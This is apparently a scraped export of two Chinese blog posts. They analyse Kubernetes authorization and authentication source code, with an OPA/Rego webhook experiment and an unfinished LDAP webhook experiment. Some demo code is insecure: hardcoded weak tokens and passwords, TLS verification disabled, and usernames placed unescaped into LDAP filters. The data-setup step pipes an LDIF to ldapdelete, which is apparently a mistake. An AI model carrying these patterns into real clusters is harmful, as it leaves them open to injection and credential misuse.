*authorizationv1.SubjectAccessReview // WithExponentialBackoff will return SAR create error (sarErr) if any. if err := webhook.WithExponentialBackoff(ctx, w.retryBackoff, func() error { var sarErr error var statusCode int start := time.Now() result, statusCode, sarErr = w.subjectAccessReview.Create(ctx, r, metav1.CreateOptions{}) latency := time.Since(start) if statusCode != 0 { w.metrics.RecordRequestTotal(ctx, strconv.Itoa(statusCode)) w.metrics.RecordRequestLatency(ctx, strconv.Itoa(statusCode), latency.Seconds()) return sarErr } if sarErr != nil { w.metrics.RecordRequestTotal(ctx, \u0026quot;\u0026lt;error\u0026gt;\u0026quot;) w.metrics.RecordRequestLatency(ctx, \u0026quot;\u0026lt;error\u0026gt;\u0026quot;, latency.Seconds()) } return sarErr }, webhook.DefaultShouldRetry); err != nil { klog.Errorf(\u0026quot;Failed to make webhook authorizer request: %v\u0026quot;, err) return w.decisionOnError, \u0026quot;\u0026quot;, err } r.Status = result.Status if shouldCache(attr) { if r.Status.Allowed { w.responseCache.Add(string(key), r.Status, w.authorizedTTL) } else { w.responseCache.Add(string(key), r.Status, w.unauthorizedTTL) } } } switch { case r.Status.Denied \u0026amp;\u0026amp; r.Status.Allowed: return authorizer.DecisionDeny, r.Status.Reason, fmt.Errorf(\u0026quot;webhook subject access review returned both allow and deny response\u0026quot;) case r.Status.Denied: return authorizer.DecisionDeny, r.Status.Reason, nil case r.Status.Allowed: return authorizer.DecisionAllow, r.Status.Reason, nil default: return authorizer.DecisionNoOpinion, r.Status.Reason, nil } } 执行 webhook.Authorize() 会执行 w.subjectAccessReview.Create() 在这里可以看到会发起一个POST请求将 v1beta1.SubjectAccessReview 传入给webhook\nk8s.io/apiserver/plugin/pkg/authorizer/webhook/webhook.go.Create\nfunc (t *subjectAccessReviewV1Client) Create(ctx context.Context, subjectAccessReview *authorizationv1.SubjectAccessReview, opts metav1.CreateOptions) (result *authorizationv1.SubjectAccessReview, statusCode int, err error) { result = \u0026amp;authorizationv1.SubjectAccessReview{} restResult := t.client.Post(). Resource(\u0026quot;subjectaccessreviews\u0026quot;). VersionedParams(\u0026amp;opts, scheme.ParameterCodec). Body(subjectAccessReview). Do(ctx) restResult.StatusCode(\u0026amp;statusCode) err = restResult.Into(result) return } 实验：基于OPA的RBAC模型 通过上面阐述，大致了解到kubernetes认证框架中的用户的分类以及认证的策略由哪些，实验的目的也是为了阐述一个结果，就是使用OIDC/webhook 是比其他方式更好的保护，管理kubernetes集群。首先在安全上，假设网络环境是不安全的，那么任意node节点遗漏 bootstrap token文件，就意味着拥有了集群中最高权限；其次在管理上，越大的团队，人数越多，不可能每个用户都提供单独的证书或者token，要知道传统教程中讲到token在kubernetes集群中是永久有效的，除非你删除了这个secret/sa；而Kubernetes提供的插件就很好的解决了这些问题。\n实验环境 一个kubernetes集群 了解OPA相关技术 实验大致分为以下几个步骤：\n建立一个HTTP服务器用于返回给kubernetes Authorization服务 查询用户操作是否有权限 实验开始 编写webhook Authorization 这里做的就是接收 subjectAccessReview ，将授权结果赋予 subjectAccessReview.Status.Allowed ，true/false，然后返回 subjectAccessReview 即可\nfunc serveAuthorization(w http.ResponseWriter, r *http.Request) { b, err := ioutil.ReadAll(r.Body) if err != nil { httpError(w, err) return } klog.V(4).Info(\u0026quot;Receied: \u0026quot;, string(b)) var subjectAccessReview authoV1.SubjectAccessReview err = json.Unmarshal(b, \u0026amp;subjectAccessReview) if err != nil { klog.V(3).Info(\u0026quot;Json convert err: \u0026quot;, err) httpError(w, err) return } subjectAccessReview.Status.Allowed = rbac.RBACChek(\u0026amp;subjectAccessReview) b, err = json.Marshal(subjectAccessReview) if err != nil { klog.V(3).Info(\u0026quot;Json convert err: \u0026quot;, err) httpError(w, err) return } w.Write(b) klog.V(3).Info(\u0026quot;Returning: \u0026quot;, string(b)) } 编写rego 这里简单配置了两个权限，admin 组拥有所有操作权限，不包含 watch ，而 conf 组只能 list，在访问控制三部曲中，已授权的会增加一个组，例如 system:authenticated 代表被 Authentication 授予通过的用户，所以 Groups 为一个数组格式，这里检查为两个数组的交集 \u0026gt; 1，则肯定代表这个用户拥有该组的权限。\n实验中 rego 部分可以在 playground 中测试\nvar module = `package k8s import future.keywords.in default allow = false admin_verbs := {\u0026quot;create\u0026quot;, \u0026quot;list\u0026quot;, \u0026quot;delete\u0026quot;, \u0026quot;update\u0026quot;} admin_groups := {\u0026quot;admin\u0026quot;} conf_groups := {\u0026quot;conf\u0026quot;} conf_verbs := {\u0026quot;list\u0026quot;} allow { groups := {v | v := input.spec.groups[_]} count(admin_groups \u0026amp; groups) \u0026gt; 0 input.spec.resourceAttributes.verb in admin_verbs } allow { groups := {v | v := input.spec.groups[_]} count(conf_groups \u0026amp; groups) \u0026gt; 0 input.spec.resourceAttributes.verb in conf_verbs } ` 下面编写 RBACChek 函数，由于go1.16提供了embed功能，就可以直接将 rego embed go中，最后result.Allowed() 如果 input 通过评估则为 true ，反之亦然\nfunc RBACChek(req *authoV1.SubjectAccessReview) bool { fmt.Printf(\u0026quot;\\n%+v\\n\u0026quot;, req) query, err := rego.New( // query是要检查的模块，data是固定格式，这与playground中不一样，需要.allow // k8s是package rego.Query(\u0026quot;data.k8s.allow\u0026quot;), rego.Module(\u0026quot;k8s.allow\u0026quot;, module), ).PrepareForEval(context.TODO()) if err != nil { klog.V(4).Info(err) return false } result, err := query.Eval(context.TODO(), rego.EvalInput(req)) if err != nil { klog.V(4).Info(\u0026quot;evaluation error:\u0026quot;, err) return false } else if len(result) == 0 { klog.V(4).Info(\u0026quot;undefined result\u0026quot;, err) return false } return result.Allowed() } 配置kube-apiserver Authorization webhook 与其他 webhook 一样，启用的方法也是修改 kube-apiserver 参数，并指定 kubeconfig 类型的配置文件，其中对于 Kubernetes 集群来说 kubeconfig 是 kubernetes 客户端访问的信息，而 webhook 这里的 kubeconfig 配置文件要填写的则是 webhook的信息，其中 user,cluster,contexts 属性均为 webhook的配置信息 [1]。\napiVersion: v1 kind: Config clusters: - cluster: server: http://10.0.0.1:88/authorization insecure-skip-tls-verify: true name: authorizator users: - name: webhook-authorizator current-context: webhook-authorizator@authorizator contexts: - context: cluster: authorizator user: webhook-authorizator name: webhook-authorizator@authorizator 修改 kube-apiserver 参数\n--authorization-webhook-config-file=/etc/kubernetes/auth/authorization-webhook.conf \\ # 1s 是为了在测试时减少等待的时间，否则缓存太长不会走webhook --authorization-webhook-cache-authorized-ttl=1s \\ --authorization-webhook-cache-unauthorized-ttl=1s \\ # api版本建议还是指定下，因为v1与v1beta1的 subjectAccessReview 内容不同rego因为格式问题会为空从而false # 代码中schema v1与v1beta1相同，测试时收到的请求的格式不一样，没找到原因 TODO --authorization-webhook-version=v1 \\ 验证结果 准备三个外部用户，admin,admin1,searchUser，admin,admin1 为 admin 组，拥有所有权限，searchUser 为 conf 组，仅能 list 操作\n- name: admin user: token: admin@111 - name: admin1 user: token: admin1@111 - name: searchUser user: token: searchUser@111 测试用户 searchUser ，可以看到只能list操作\n$ kubectl get pod --user=searchUser NAME READY STATUS RESTARTS AGE netbox-85865d5556-hfg6v 1/1 Running 0 96d netbox-85865d5556-vlgr4 1/1 Running 0 96d pod 0/1 CrashLoopBackOff 95 22h $ kubectl delete pod pod --user=searchUser Error from server (Forbidden): pods \u0026quot;pod\u0026quot; is forbidden: User \u0026quot;searchUser\u0026quot; cannot delete resource \u0026quot;pods\u0026quot; in API group \u0026quot;\u0026quot; in the namespace \u0026quot;default\u0026quot; 测试用户 admin，可以看出可以进行写与查看的操作\n$ kubectl delete pod pod --user=admin pod \u0026quot;pod\u0026quot; deleted $ kubectl get pod --user=admin NAME READY STATUS RESTARTS AGE netbox-85865d5556-hfg6v 1/1 Running 0 96d netbox-85865d5556-vlgr4 1/1 Running 0 96d 总结 kubernetes 提供了 Authentication,Authorization,Adminsion Control,Audit 几种webhook，可以自行在Kubernetes之上实现一个4A的标准，Authorization部分提供了一个并行与，但脱离Kubernetes的授权系统，使得外部用户可以很灵活的被授权，而不是手动管理多个clusterrolebinding,rolebingding 之类的资源。\n实验中使用了OPA，这里是将rego静态文件embed入go中，在正常情况下OPA给出的架构如下图所示，存在一个 OPA Service，来进行验证，而实验中是直接嵌入到go中，OPA本身也提供了 HTTP Service，可以直接编译运行为 HTTP服务 [2]。 TODO\n图：OPA 架构 Source：https://www.openpolicyagent.org/docs/latest/\nOPA本身提供了 Gatekeeper ，可以作为Kubernetes 资源使用，官方示例是作为为一个kubernetes准入网关，也提供了ingress浏览的验证 [3]\nNotes：实验中还需要注意的一点则是，如果RBAC与webhook同时验证时，需要合理的规划权限，例如集群组件的账户，coreDNS，flannel等，也会被拒绝（在OPA设置的 default allow = false ）。\nReference [1] Webhook Mode\n[2] HTTP APIs\n[3] What is OPA Gatekeeper?\n[4] 用 Goalng 开发 OPA 策略\n[5] 初探 Open Policy Agent 實作 RBAC (Role-based access control) 權限控管\n","permalink":"https://www.oomkill.com/2022/11/ch32-authorization/","summary":"","title":"深入理解Kubernetes 4A - Authorization源码解析"},{"content":"Overview 本文是关于Kubernetes 4A解析的第一章\n深入理解Kubernetes 4A - Authentication源码解析 深入理解Kubernetes 4A - Authorization源码解析 深入理解Kubernetes 4A - Admission Control源码解析 深入理解Kubernetes 4A - Audit源码解析 所有关于Kubernetes 4A部分代码上传至仓库 github.com/cylonchau/hello-k8s-4A\n本章主要简单阐述kubernetes 认证相关原理，最后以实验来阐述kubernetes用户系统的思路\nobjective：\n了解kubernetes 各种认证机制的原理 了解kubernetes 用户的概念 了解kubernetes authentication webhook 完成实验，如何将其他用户系统接入到kubernetes中的一个思路 如有错别字或理解错误地方请多多担待，代码是以1.24进行整理，实验是以1.19环境进行，差别不大。\nKubernetes 认证 在Kubernetes apiserver对于认证部分所描述的，对于所有用户访问Kubernetes API（通过任何客户端，客户端库，kubectl 等）时都会经历 验证 (Authentication) , 授权 (Authorization), 和准入控制 (Admission control) 三个阶段来完成对 “用户” 进行授权，整个流程正如下图所示\n图：Kubernetes API 请求的请求处理步骤图 Source：https://www.armosec.io/blog/kubernetes-admission-controller/\n其中在大多数教程中，在对这三个阶段所做的工作大致上为：\nAuthentication 阶段所指用于确认请求访问Kubernetes API 用户是否为合法用户，拒绝为401\nAuthorization 阶段所指的将是这个用户是否有对操作的资源的权限，拒绝为403\nAdmission control 阶段所指控制对请求资源进行控制，通俗来说，就是一票否决权，即使前两个步骤完成\n到这里了解到了Kubernetes API实际上做的工作就是 “人类用户” 与 “kubernetes service account\u0026quot; [2]；那么就引出了一个重要概念就是 “用户” 在Kubernetes中是什么，以及用户在认证中的也是本章节的中心。\n在Kubernetes官方手册中给出了 ”用户“ 的概念，Kubernetes集群中存在的用户包括 ”普通用户“ 与 “service account” 但是 Kubernetes 没有普通用户的管理方式，只是将使用集群的证书CA签署的有效证书的用户都被视为合法用户 [3]\n那么对于使得Kubernetes集群有一个真正的用户系统，就可以根据上面给出的概念将Kubernetes用户分为 ”外部用户“ 与 ”内部用户“。如何理解外部与内部用户呢？实际上就是有Kubernetes管理的用户，即在kubernetes定义用户的数据模型这种为 “内部用户” ，正如 service account；反之，非Kubernetes托管的用户则为 ”外部用户“ 这中概念也更好的对kubernetes用户的阐述。\n对于外部用户来说，实际上Kubernetes给出了多种用户概念 [3]，例如：\n拥有kubernetes集群证书的用户 拥有Kubernetes集群token的用户（--token-auth-file 指定的静态token） 用户来自外部用户系统，例如 OpenID，LDAP，QQ connect, google identity platform 等 向外部用户授权集群访问的示例 场景1：通过证书请求k8s 该场景中kubernetes将使用证书中的cn作为用户，ou作为组，如果对应 rolebinding/clusterrolebinding 给予该用户权限，那么请求为合法\n$ curl https://hostname:6443/api/v1/pods \\ --cert ./client.pem \\ --key ./client-key.pem \\ --cacert ./ca.pem 接下来浅析下在代码中做的事情\n确认用户是 apiserver 在 Authentication 阶段 做的事情，而对应代码在 pkg/kubeapiserver/authenticator 下，整个文件就是构建了一系列的认证器，而x.509证书指是其中一个\n// 创建一个认证器，返回请求或一个k8s认证机制的标准错误 func (config Config) New() (authenticator.Request, *spec.SecurityDefinitions, error) { ... // X509 methods // 可以看到这里就是将x509证书解析为user if config.ClientCAContentProvider != nil { certAuth := x509.NewDynamic(config.ClientCAContentProvider.VerifyOptions, x509.CommonNameUserConversion) authenticators = append(authenticators, certAuth) } ... 接下来看实现原理，NewDynamic函数位于代码 k8s.io/apiserver/pkg/authentication/request/x509/x509.go\n通过代码可以看出，是通过一个验证函数与用户来解析为一个 Authenticator\n// NewDynamic returns a request.Authenticator that verifies client certificates using the provided // VerifyOptionFunc (which may be dynamic), and converts valid certificate chains into user.Info using the provided UserConversion func NewDynamic(verifyOptionsFn VerifyOptionFunc, user UserConversion) *Authenticator { return \u0026amp;Authenticator{verifyOptionsFn, user} } 验证函数为 CAContentProvider 的方法，而x509部分实现为 k8s.io/apiserver/pkg/server/dynamiccertificates/dynamic_cafile_content.go.VerifyOptions；可以看出返回是一个 x509.VerifyOptions + 与认证的状态\n// VerifyOptions provides verifyoptions compatible with authenticators func (c *DynamicFileCAContent) VerifyOptions() (x509.VerifyOptions, bool) { uncastObj := c.caBundle.Load() if uncastObj == nil { return x509.VerifyOptions{}, false } return uncastObj.(*caBundleAndVerifier).verifyOptions, true } 而用户的获取则位于 k8s.io/apiserver/pkg/authentication/request/x509/x509.go；可以看出，用户正是拿的证书的CN，而组则是为证书的OU\n// CommonNameUserConversion builds user info from a certificate chain using the subject's CommonName var CommonNameUserConversion = UserConversionFunc(func(chain []*x509.Certificate) (*authenticator.Response, bool, error) { if len(chain[0].Subject.CommonName) == 0 { return nil, false, nil } return \u0026amp;authenticator.Response{ User: \u0026amp;user.DefaultInfo{ Name: chain[0].Subject.CommonName, Groups: chain[0].Subject.Organization, }, }, true, nil }) 由于授权不在本章范围内，直接忽略至入库阶段，入库阶段由 RESTStorageProvider 实现 这里，每一个Provider都提供了 Authenticator 这里包含了已经允许的请求，将会被对应的REST客户端写入到库中\ntype RESTStorageProvider struct { Authenticator authenticator.Request APIAudiences authenticator.Audiences } // RESTStorageProvider is a factory type for REST storage. type RESTStorageProvider interface { GroupName() string NewRESTStorage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) (genericapiserver.APIGroupInfo, error) } 场景2：通过token 该场景中，当 kube-apiserver 开启了 --enable-bootstrap-token-auth 时，就可以使用 Bootstrap Token 进行认证，通常如下列命令，在请求头中增加 Authorization: Bearer \u0026lt;token\u0026gt; 标识\n$ curl https://hostname:6443/api/v1/pods \\ --cacert ${CACERT} \\ --header \u0026quot;Authorization: Bearer \u0026lt;token\u0026gt;\u0026quot; \\ 接下来浅析下在代码中做的事情\n可以看到，在代码 pkg/kubeapiserver/authenticator.New() 中当 kube-apiserver 指定了参数 --token-auth-file=/etc/kubernetes/token.csv\u0026quot; 这种认证会被激活\nif len(config.TokenAuthFile) \u0026gt; 0 { tokenAuth, err := newAuthenticatorFromTokenFile(config.TokenAuthFile) if err != nil { return nil, nil, err } tokenAuthenticators = append(tokenAuthenticators, authenticator.WrapAudienceAgnosticToken(config.APIAudiences, tokenAuth)) } 此时打开 token.csv 查看下token长什么样\n$ cat /etc/kubernetes/token.csv 12ba4f.d82a57a4433b2359,\u0026quot;system:bootstrapper\u0026quot;,10001,\u0026quot;system:bootstrappers\u0026quot; 这里回到代码 k8s.io/apiserver/pkg/authentication/token/tokenfile/tokenfile.go.NewCSV ，这里可以看出，就是读取 --token-auth-file= 参数指定的tokenfile，然后解析为用户，record[1] 作为用户名，record[2] 作为UID\n// NewCSV returns a TokenAuthenticator, populated from a CSV file. // The CSV file must contain records in the format \u0026quot;token,username,useruid\u0026quot; func NewCSV(path string) (*TokenAuthenticator, error) { file, err := os.Open(path) if err != nil { return nil, err } defer file.Close() recordNum := 0 tokens := make(map[string]*user.DefaultInfo) reader := csv.NewReader(file) reader.FieldsPerRecord = -1 for { record, err := reader.Read() if err == io.EOF { break } if err != nil { return nil, err } if len(record) \u0026lt; 3 { return nil, fmt.Errorf(\u0026quot;token file '%s' must have at least 3 columns (token, user name, user uid), found %d\u0026quot;, path, len(record)) } recordNum++ if record[0] == \u0026quot;\u0026quot; { klog.Warningf(\u0026quot;empty token has been found in token file '%s', record number '%d'\u0026quot;, path, recordNum) continue } obj := \u0026amp;user.DefaultInfo{ Name: record[1], UID: record[2], } if _, exist := tokens[record[0]]; exist { klog.Warningf(\u0026quot;duplicate token has been found in token file '%s', record number '%d'\u0026quot;, path, recordNum) } tokens[record[0]] = obj if len(record) \u0026gt;= 4 { obj.Groups = strings.Split(record[3], \u0026quot;,\u0026quot;) } } return \u0026amp;TokenAuthenticator{ tokens: tokens, }, nil } 而token file中配置的格式正是以逗号分隔的一组字符串，\ntype DefaultInfo struct { Name string UID string Groups []string Extra map[string][]string } 这种用户最常见的方式就是 kubelet 通常会以此类用户向控制平面进行身份认证，例如下列配置\nKUBELET_ARGS=\u0026quot;--v=0 \\ --logtostderr=true \\ --config=/etc/kubernetes/kubelet-config.yaml \\ --kubeconfig=/etc/kubernetes/auth/kubelet.conf \\ --network-plugin=cni \\ --pod-infra-container-image=registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 \\ --bootstrap-kubeconfig=/etc/kubernetes/auth/bootstrap.conf\u0026quot; /etc/kubernetes/auth/bootstrap.conf 内容，这里就用到了 kube-apiserver 配置的 --token-auth-file= 用户名，组必须为 system:bootstrappers\napiVersion: v1 clusters: - cluster: certificate-authority-data: ...... server: https://10.0.0.4:6443 name: kubernetes contexts: - context: cluster: kubernetes user: system:bootstrapper name: system:bootstrapper@kubernetes current-context: system:bootstrapper@kubernetes kind: Config preferences: {} users: - name: system:bootstrapper 而通常在二进制部署时会出现的问题，例如下列错误\nUnable to register node \u0026quot;hostname\u0026quot; with API server: nodes is forbidden: User \u0026quot;system:anonymous\u0026quot; cannot create resource \u0026quot;nodes\u0026quot; in API group \u0026quot;\u0026quot; at the cluster scope 而通常解决方法是执行下列命令，这里就是将 kubelet 与 kube-apiserver 通讯时的用户授权，因为kubernetes官方给出的条件是，用户组必须为 system:bootstrappers [4]\n$ kubectl create clusterrolebinding kubelet-bootstrap --clusterrole=system:node-bootstrapper --group=system:bootstrappers 生成的clusterrolebinding 如下\napiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: creationTimestamp: \u0026quot;2022-08-14T22:26:51Z\u0026quot; managedFields: - apiVersion: rbac.authorization.k8s.io/v1 fieldsType: FieldsV1 ... time: \u0026quot;2022-08-14T22:26:51Z\u0026quot; name: kubelet-bootstrap resourceVersion: \u0026quot;158\u0026quot; selfLink: /apis/rbac.authorization.k8s.io/v1/clusterrolebindings/kubelet-bootstrap uid: b4d70f4f-4ae0-468f-86b7-55e9351e4719 roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: system:node-bootstrapper subjects: - apiGroup: rbac.authorization.k8s.io kind: Group name: system:bootstrappers 上述就是 bootstrap token，翻译后就是引导token，因为其做的工作就是将节点载入Kubernetes系统过程提供认证机制的用户。\nNotes：这种用户不存在与kubernetes内，可以算属于一个外部用户，但认证机制中存在并绑定了最高权限，也可以用来做其他访问时的认证\n场景3：serviceaccount serviceaccount通常为API自动创建的，但在用户中，实际上认证存在两个方向，一个是 --service-account-key-file 这个参数可以指定多个，指定对应的证书文件公钥或私钥，用以办法sa的token\n首先会根据指定的公钥或私钥文件生成token\nif len(config.ServiceAccountKeyFiles) \u0026gt; 0 { serviceAccountAuth, err := newLegacyServiceAccountAuthenticator(config.ServiceAccountKeyFiles, config.ServiceAccountLookup, config.APIAudiences, config.ServiceAccountTokenGetter) if err != nil { return nil, nil, err } tokenAuthenticators = append(tokenAuthenticators, serviceAccountAuth) } if len(config.ServiceAccountIssuers) \u0026gt; 0 { serviceAccountAuth, err := newServiceAccountAuthenticator(config.ServiceAccountIssuers, config.ServiceAccountKeyFiles, config.APIAudiences, config.ServiceAccountTokenGetter) if err != nil { return nil, nil, err } tokenAuthenticators = append(tokenAuthenticators, serviceAccountAuth) } 对于 --service-account-key-file 他生成的用户都是 “kubernetes/serviceaccount” , 而对于 --service-account-issuer 只是对sa颁发者提供了一个称号标识是谁，而不是统一的 “kubernetes/serviceaccount” ，这里可以从代码中看到，两者是完全相同的，只是称号不同罢了\n// newLegacyServiceAccountAuthenticator returns an authenticator.Token or an error func newLegacyServiceAccountAuthenticator(keyfiles []string, lookup bool, apiAudiences authenticator.Audiences, serviceAccountGetter serviceaccount.ServiceAccountTokenGetter) (authenticator.Token, error) { allPublicKeys := []interface{}{} for _, keyfile := range keyfiles { publicKeys, err := keyutil.PublicKeysFromFile(keyfile) if err != nil { return nil, err } allPublicKeys = append(allPublicKeys, publicKeys...) } // 唯一的区别 这里使用了常量 serviceaccount.LegacyIssuer tokenAuthenticator := serviceaccount.JWTTokenAuthenticator([]string{serviceaccount.LegacyIssuer}, allPublicKeys, apiAudiences, serviceaccount.NewLegacyValidator(lookup, serviceAccountGetter)) return tokenAuthenticator, nil } // newServiceAccountAuthenticator returns an authenticator.Token or an error func newServiceAccountAuthenticator(issuers []string, keyfiles []string, apiAudiences authenticator.Audiences, serviceAccountGetter serviceaccount.ServiceAccountTokenGetter) (authenticator.Token, error) { allPublicKeys := []interface{}{} for _, keyfile := range keyfiles { publicKeys, err := keyutil.PublicKeysFromFile(keyfile) if err != nil { return nil, err } allPublicKeys = append(allPublicKeys, publicKeys...) } // 唯一的区别 这里根据kube-apiserver提供的称号指定名称 tokenAuthenticator := serviceaccount.JWTTokenAuthenticator(issuers, allPublicKeys, apiAudiences, serviceaccount.NewValidator(serviceAccountGetter)) return tokenAuthenticator, nil } 最后根据ServiceAccounts，Secrets等值签发一个token，也就是通过下列命令获取的值\n$ kubectl get secret multus-token-v6bfg -n kube-system -o jsonpath={\u0026quot;.data.token\u0026quot;} 场景4：openid OpenID Connect是 OAuth2 风格，允许用户授权三方网站访问他们存储在另外的服务提供者上的信息，而不需要将用户名和密码提供给第三方网站或分享他们数据的所有内容，下面是一张kubernetes 使用 OID 认证的逻辑图\n图：Kubernetes OID认证 Source：https://developer.okta.com/blog/2021/11/08/k8s-api-server-oidc\n场景5：webhook webhook是kubernetes提供自定义认证的其中一种，主要是用于认证 “不记名 token“ 的钩子，“不记名 token“ 将 由身份验证服务创建。当用户对kubernetes访问时，会触发准入控制，当对kubernetes集群注册了 authenticaion webhook时，将会使用该webhook提供的方式进行身份验证时，此时会为您生成一个 token 。\n如代码 pkg/kubeapiserver/authenticator.New() 中所示 newWebhookTokenAuthenticator 会通过提供的config (--authentication-token-webhook-config-file) 来创建出一个 WebhookTokenAuthenticator\nif len(config.WebhookTokenAuthnConfigFile) \u0026gt; 0 { webhookTokenAuth, err := newWebhookTokenAuthenticator(config) if err != nil { return nil, nil, err } tokenAuthenticators = append(tokenAuthenticators, webhookTokenAuth) } 下图是kubernetes 中 WebhookToken 验证的工作原理\n图：kubernetes WebhookToken验证原理 Source：https://learnk8s.io/kubernetes-custom-authentication\n最后由token中的authHandler，循环所有的Handlers在运行 AuthenticateToken 去进行获取用户的信息\nfunc (authHandler *unionAuthTokenHandler) AuthenticateToken(ctx context.Context, token string) (*authenticator.Response, bool, error) { var errlist []error for _, currAuthRequestHandler := range authHandler.Handlers { info, ok, err := currAuthRequestHandler.AuthenticateToken(ctx, token) if err != nil { if authHandler.FailOnError { return info, ok, err } errlist = append(errlist, err) continue } if ok { return info, ok, err } } return nil, false, utilerrors.NewAggregate(errlist) } 而webhook插件也实现了这个方法 AuthenticateToken ,这里会通过POST请求，调用注入的webhook，该请求携带一个JSON 格式的 TokenReview 对象，其中包含要验证的令牌\nfunc (w *WebhookTokenAuthenticator) AuthenticateToken(ctx context.Context, token string) (*authenticator.Response, bool, error) { .... start := time.Now() result, statusCode, tokenReviewErr = w.tokenReview.Create(ctx, r, metav1.CreateOptions{}) latency := time.Since(start) ... } webhook token认证服务要返回用户的身份信息，就是上面token部分提到的数据结构（webhook来决定接受还是拒绝该用户）\ntype DefaultInfo struct { Name string UID string Groups []string Extra map[string][]string } 场景6：代理认证 实验：基于LDAP的身份认证 通过上面阐述，大致了解到kubernetes认证框架中的用户的分类以及认证的策略由哪些，实验的目的也是为了阐述一个结果，就是使用OIDC/webhook 是比其他方式更好的保护，管理kubernetes集群。首先在安全上，假设网络环境是不安全的，那么任意node节点遗漏 bootstrap token文件，就意味着拥有了集群中最高权限；其次在管理上，越大的团队，人数越多，不可能每个用户都提供单独的证书或者token，要知道传统教程中讲到token在kubernetes集群中是永久有效的，除非你删除了这个secret/sa；而Kubernetes提供的插件就很好的解决了这些问题。\n实验环境 一个kubernetes集群 一个openldap服务，建议可以是集群外部的，因为webhook不像SSSD有缓存机制，并且集群不可用，那么认证不可用，当认证不可用时会导致集群不可用，这样事故影响的范围可以得到控制，也叫最小化半径 了解ldap相关技术，并了解go ldap客户端 实验大致分为以下几个步骤：\n建立一个HTTP服务器用于返回给kubernetes Authenticaion服务 查询ldap该用户是否合法 查询用户是否合法 查询用户所属组是否拥有权限 实验开始 初始化用户数据 首先准备openldap初始化数据，创建三个 posixGroup 组，与5个用户 admin, admin1, admin11, searchUser, syncUser 密码均为111，组与用户关联使用的 memberUid\ncat \u0026lt;\u0026lt; EOF | ldapdelete -r -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111 dn: dc=test,dc=com objectClass: top objectClass: organizationalUnit objectClass: extensibleObject description: US Organization ou: people dn: ou=tvb,dc=test,dc=com objectClass: organizationalUnit description: Television Broadcasts Limited ou: tvb dn: cn=admin,ou=tvb,dc=test,dc=com objectClass: posixGroup gidNumber: 10000 cn: admin dn: cn=conf,ou=tvb,dc=test,dc=com objectClass: posixGroup gidNumber: 10001 cn: conf dn: cn=dir,ou=tvb,dc=test,dc=com objectClass: posixGroup gidNumber: 10002 cn: dir dn: uid=syncUser,ou=tvb,dc=test,dc=com objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person objectClass: posixAccount objectClass: shadowAccount objectClass: pwdPolicy pwdAttribute: userPassword uid: syncUser cn: syncUser uidNumber: 10006 gidNumber: 10002 homeDirectory: /home/syncUser loginShell: /bin/bash sn: syncUser givenName: syncUser memberOf: cn=confGroup,ou=tvb,dc=test,dc=com dn: uid=searchUser,ou=tvb,dc=test,dc=com objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person objectClass: posixAccount objectClass: shadowAccount objectClass: pwdPolicy pwdAttribute: userPassword uid: searchUser cn: searchUser uidNumber: 10005 gidNumber: 10001 homeDirectory: /home/searchUser loginShell: /bin/bash sn: searchUser givenName: searchUser memberOf: cn=dirGroup,ou=tvb,dc=test,dc=com dn: uid=admin1,ou=tvb,dc=test,dc=com objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person objectClass: posixAccount objectClass: shadowAccount objectClass: pwdPolicy pwdAttribute: userPassword uid: admin1 sn: admin1 cn: admin uidNumber: 10010 gidNumber: 10000 homeDirectory: /home/admin loginShell: /bin/bash givenName: admin memberOf: cn=adminGroup,ou=tvb,dc=test,dc=com dn: uid=admin11,ou=tvb,dc=test,dc=com objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person objectClass: posixAccount objectClass: shadowAccount objectClass: pwdPolicy sn: admin11 pwdAttribute: userPassword uid: admin11 cn: admin11 uidNumber: 10011 gidNumber: 10000 homeDirectory: /home/admin loginShell: /bin/bash givenName: admin11 memberOf: cn=adminGroup,ou=tvb,dc=test,dc=com dn: uid=admin,ou=tvb,dc=test,dc=com objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person objectClass: posixAccount objectClass: shadowAccount objectClass: pwdPolicy pwdAttribute: userPassword uid: admin cn: admin uidNumber: 10009 gidNumber: 10000 homeDirectory: /home/admin loginShell: /bin/bash sn: admin givenName: admin memberOf: cn=adminGroup,ou=tvb,dc=test,dc=com EOF 接下来需要确定如何为认证成功的用户，上面讲到对于kubernetes中用户格式为 v1.UserInfo 的格式，即要获得用户，即用户组，假设需要查找的用户为，admin，那么在openldap中查询filter如下：\n\u0026quot;(|(\u0026amp;(objectClass=posixAccount)(uid=admin))(\u0026amp;(objectClass=posixGroup)(memberUid=admin)))\u0026quot; 上面语句意思是，找到 objectClass=posixAccount 并且 uid=admin 或者 objectClass=posixGroup 并且 memberUid=admin 的条目信息，这里使用 ”|“ 与 ”\u0026amp;“ 是为了要拿到这两个结果。\n编写webhook查询用户部分 这里由于openldap配置密码保存格式不是明文的，如果直接使用 ”=“ 来验证是查询不到内容的，故直接多用了一次登录来验证用户是否合法\nfunc ldapSearch(username, password string) (*v1.UserInfo, error) { ldapconn, err := ldap.DialURL(ldapURL) if err != nil { klog.V(3).Info(err) return nil, err } defer ldapconn.Close() // Authenticate as LDAP admin user err = ldapconn.Bind(\u0026quot;uid=searchUser,ou=tvb,dc=test,dc=com\u0026quot;, \u0026quot;111\u0026quot;) if err != nil { klog.V(3).Info(err) return nil, err } // Execute LDAP Search request result, err := ldapconn.Search(ldap.NewSearchRequest( \u0026quot;ou=tvb,dc=test,dc=com\u0026quot;, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false, fmt.Sprintf(\u0026quot;(\u0026amp;(objectClass=posixGroup)(memberUid=%s))\u0026quot;, username), // Filter nil, nil, )) if err != nil { klog.V(3).Info(err) return nil, err } userResult, err := ldapconn.Search(ldap.NewSearchRequest( \u0026quot;ou=tvb,dc=test,dc=com\u0026quot;, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false, fmt.Sprintf(\u0026quot;(\u0026amp;(objectClass=posixAccount)(uid=%s))\u0026quot;, username), // Filter nil, nil, )) if err != nil { klog.V(3).Info(err) return nil, err } if len(result.Entries) == 0 { 